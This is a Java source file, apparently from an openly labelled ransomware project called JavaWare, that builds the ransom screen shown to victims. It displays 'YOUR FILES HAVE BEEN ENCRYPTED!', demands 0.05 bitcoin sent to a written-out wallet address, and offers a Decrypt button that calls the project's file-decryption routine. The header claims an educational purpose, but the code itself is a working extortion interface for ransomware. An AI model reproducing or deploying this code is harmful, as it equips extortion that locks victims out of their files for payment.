/********************************************************************
     _____                        _        _
    |_   _|                      | |      | |
      | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
      | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
    __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
   \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


 Copyright (c) 2019 Kyra Mozley
 Created on 05/08/19
 Version 2.0

 Disclaimer: This project is purely for educational purposes
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
 EXECUTE ONLY IN A TEST ENVIRONMENT
 DO NOT USE FOR MALICIOUS ACTIVITY

 *********************************************************************/

package RansomeWare;

import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import javafx.scene.text.Font;
import javafx.scene.text.FontWeight;
import javafx.scene.text.Text;
import javafx.scene.text.TextAlignment;
import javafx.stage.Stage;

import java.io.File;


public class TakeOver extends Application {

    @Override
    public void start(Stage primaryStage) {
        primaryStage.setTitle("JavaWare");

        GridPane grid = new GridPane();
        grid.setAlignment(Pos.CENTER);
        grid.setHgap(10);
        grid.setVgap(10);
        grid.setStyle("-fx-background-image: url('https://i.ibb.co/Sc7BvhL/background.png');");
        Scene scene = new Scene(grid, 1200, 800);
        primaryStage.setScene(scene);

        GridPane g = new GridPane();
        grid.setAlignment(Pos.TOP_CENTER);
        grid.setHgap(0);
        grid.setVgap(0);

        Image lock = new Image("https://i.ibb.co/fDDZ26F/lock.png");
        ImageView lockView = new ImageView();
        lockView.setFitHeight(300);
        lockView.setFitWidth(300);
        lockView.setImage(lock);
        g.add(lockView, 2, 0, 1, 1);
        grid.add(g, 0,0);

        GridPane gridPane = new GridPane();
        gridPane.setAlignment(Pos.CENTER);
        gridPane.setStyle("-fx-background-color: white;");
        gridPane.setHgap(30);
        gridPane.setVgap(30);


        grid.add(gridPane, 0,1);



        Text scenetitle = new Text("YOUR FILES HAVE BEEN ENCRYPTED!");
        scenetitle.setFont(Font.font("Tahoma", FontWeight.EXTRA_BOLD, 40));
        scenetitle.setFill(Color.RED);
        scenetitle.setTextAlignment(TextAlignment.CENTER);
        scenetitle.wrappingWidthProperty().bind(gridPane.widthProperty());
        gridPane.add(scenetitle, 0,1);


        Text description = new Text("It is impossible to decrypt your files without a special key. The only way to get your files back is to send 0.05 bitcoin to:");
        description.setFont(Font.font("Tahoma", FontWeight.BOLD, 15));
        description.setTextAlignment(TextAlignment.CENTER);
        description.baselineOffsetProperty();
        description.wrappingWidthProperty().bind(gridPane.widthProperty());
        gridPane.add(description, 0,3);

        Text address = new Text("3JNQdC7hgXc5YneUZBAfLVW4fEZMTs2qYq");
        address.setFont(Font.font("Tahoma", FontWeight.BOLD, 20));
        address.setTextAlignment(TextAlignment.CENTER);
        address.wrappingWidthProperty().bind(gridPane.widthProperty());
        gridPane.add(address, 0,4);



        EventHandler<ActionEvent> event = new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent actionEvent) {
                try {
                    JavaWare jw = new JavaWare();
                    jw.DecryptFiles();
                } catch(Exception e) {

                }
            }
        };

        Button b = new Button("Decrypt");
        gridPane.add(b, 1, 6);
        b.setOnAction(event);

        primaryStage.show();
    }
}
